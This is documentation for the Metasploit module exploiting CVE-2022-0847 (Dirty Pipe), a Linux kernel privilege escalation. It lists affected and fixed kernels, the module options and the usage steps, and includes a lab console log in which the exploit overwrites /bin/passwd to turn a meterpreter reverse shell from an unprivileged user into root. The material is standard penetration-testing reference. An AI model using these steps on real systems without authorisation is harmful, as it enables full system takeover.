## Vulnerable Application

This exploit targets a vulnerability in the Linux kernel since 5.8, that allows
writing of read only or immutable memory.

The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
The module exploits this vulnerability by overwriting a suid binary with the
payload, executing it, and then writing the original data back.

There are two major limitations of this exploit: the offset cannot be on a page
boundary (it needs to write one byte before the offset to add a reference to
this page to the pipe), and the write cannot cross a page boundary.
This means the payload must be less than the page size (4096 bytes).

## Verification Steps

* Start `msfconsole`
* Get a non-root shell/meterpreter session
* `use exploit/linux/local/cve_2022_0847_dirtypipe`
* `set SESSION <session>`
* `set LHOST <lhost>`
* `run`

## Options

### WRITEABLE_DIR

This indicates the location where you would like the payload and exploit stored, as well
as serving as a location to store the various files and directories created by the exploit itself.
The default value is `/tmp`

### SUID_BINARY_PATH

This option is the path of the remote suid binary that will be overwritten with the payload.
The default value is `/bin/passwd`, which should be present on most Linux distributions.

## Scenarios

### Ubuntu 20.10 x64, Kernel Linux 5.8.0-25-generic

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.140.1:4444
[*] Sending stage (3020772 bytes) to 192.168.140.139
[*] Meterpreter session 1 opened (192.168.140.1:4444 -> 192.168.140.139:55512 ) at 2022-03-10 09:54:38 -0600

meterpreter > getuid
Server username: dirtypipe
meterpreter > sysinfo
Computer     : 192.168.140.139
OS           : Ubuntu 20.10 (Linux 5.8.0-25-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/linux/local/cve_2022_0847_dirtypipe
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set session 1
session => 1
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set lhost 192.168.140.1
lhost => 192.168.140.1
msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api
[*] Started reverse TCP handler on 192.168.140.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Linux kernel version found: 5.8.0
[*] Writing '/tmp/.gxywtu' (35592 bytes) ...
[*] Executing exploit '/tmp/.gxywtu /bin/passwd'
[*] Sending stage (3020772 bytes) to 192.168.140.139
[+] Deleted /tmp/.gxywtu
[*] Meterpreter session 2 opened (192.168.140.1:4444 -> 192.168.140.139:55514 ) at 2022-03-10 09:55:03 -0600

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.140.139
OS           : Ubuntu 20.10 (Linux 5.8.0-25-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

